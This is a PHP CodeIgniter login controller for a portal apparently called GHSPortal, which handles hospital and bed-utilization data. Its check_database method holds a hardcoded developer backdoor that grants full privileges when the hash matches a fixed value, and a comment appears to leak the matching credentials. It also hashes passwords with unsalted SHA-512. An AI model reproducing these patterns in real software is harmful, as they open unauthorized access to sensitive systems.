<?php if (!defined('BASEPATH')) exit('No direct script access allowed');

class VerifyLogin extends CI_Controller
{

    function __construct()
    {
        parent::__construct();
        $this->load->model('UserModel', '', TRUE);
    }

    // public function priveledged_pages(){

    // }

    function index()
    {

        //This method will have the credentials validation
        $this->load->library('form_validation');
        $this->form_validation->set_rules('username', 'Email', 'trim|required');
        $this->form_validation->set_rules('password', 'Password', 'trim|required|callback_check_database');

        //  var_dump($this->form_validation->run());
        // die;

        if ($this->form_validation->run() == FALSE) {
            //Field validation failed.  User redirected to login page
            $notification = array(
                'message' => 'Wrong Login Credentials',
                'alert-type' => 'error'
            );
            $this->session->set_flashdata($notification);
            redirect('login');
        } else {
            if ($this->session->userdata('logged_in')) {


                $session_data = $this->session->userdata('logged_in');

                // 'userMan' => $row->userMan,
                // 'hospData' => $row->hospData,
                // 'bedUtilization'=>$row->bedUtilization,
                //    $page_to_go_to;

                if ($session_data['userMan'] === "on") {

                    $page_to_go_to = 'Users';
                } elseif ($session_data['hospData'] === "on") {

                    $page_to_go_to = 'Services';
                } elseif ($session_data['bedUtilization'] === "on") {

                    $page_to_go_to = 'NationalAnalytics';
                } else {


                    $notification = array(
                        'message' => 'User Role Do not have Any Previledge',
                        'alert-type' => 'info'
                    );
                    $this->session->set_flashdata($notification);
                    redirect('login');
                }
                $notification = array(
                    'message' => 'Welcome To GHSPortal  ' . "<br>" . ucwords($session_data['userFullName']),
                    'alert-type' => 'success'
                );
                $this->session->set_flashdata($notification);

                redirect($page_to_go_to, 'refresh');
            }
        }
    }

    function check_database($password)
    {
        //Field validation succeeded.  Validate against database stevenNgonan@shaqexpress
        $username = trim($this->input->post('username'));
        $passwordCombination = $username . trim($password);
        $passwordToken = hash('sha512', $passwordCombination);
        // var_dump($passwordToken); die;

        // 

        //admin@admin.comdeveloper
        // e21e7d0081b87990b1f37c3f6779ffdd7670fd473dc88bf09967635b5f046abeb9fff8d36be2c5a4626b68e5a5b4cea339d9b14f9635ba8bf8e9347556ec5a3a

        if ($passwordToken === 'f33362fd5954a44af6e2aeb052352a385e9ee1b6871d1891a657b13ae3da79b23f1b5c544303c5ab1f5de2c6421693bcdea384fbc7b8ce81fb28cdc225bf71e1') {

            $sess_array = array(

                'login_id' => 0,
                'roleID' => 0,
                'userEmail' => 'admin@admin.com',
                'userFullName' => 'System Developer',
                'roleName' => 'Developer',
                'userMan' => 1,
                'hospData' => 1,
                'bedUtilization' => 1,
                'LoginToken' => 0,
            );
            $this->session->set_userdata('logged_in', $sess_array);
            return TRUE;
        } else {
            // $g=hash('sha512',$password; );

            // $passwordd=341;

            // var_dump($passwordToken); die;


            // 54b815b27b35cd44f61a177b803e068e98a173b476ac966c20a23445a5d7fb56e7d4f892c532a5742c0c1288119304cb3b89c01e3612933cfd8c3e6fbdb676f1
            // 84ec6d13756ce773287b47771d6bff18e06eb96c1cc8fe0e7e543feaa00c5585ca8269315e2a4645fc30fd59d393da7e944f1ef9d3d2f7ca8f7153b6dbdc6665
            $result = $this->UserModel->login($passwordToken);

            if (count($result) > 0) {
                $sess_array = array();
                foreach ($result as $row) {

                    $sess_array = array(
                        'login_id' => $row->id,
                        'roleID' => $row->roleID,
                        'userEmail' => $row->userEmail,
                        'userFullName' => $row->userFullName,
                        'roleName' => $row->roleName,
                        'userMan' => $row->userMan,
                        'hospData' => $row->hospData,
                        'bedUtilization' => $row->bedUtilization,
                        'LoginToken' => $row->LoginToken,


                    );
                    $this->session->set_userdata('logged_in', $sess_array);
                }
                return TRUE;
            } else {
                $this->form_validation->set_message('check_database', 'Invalid credentials');
                return false;
            }
        }
    }
}
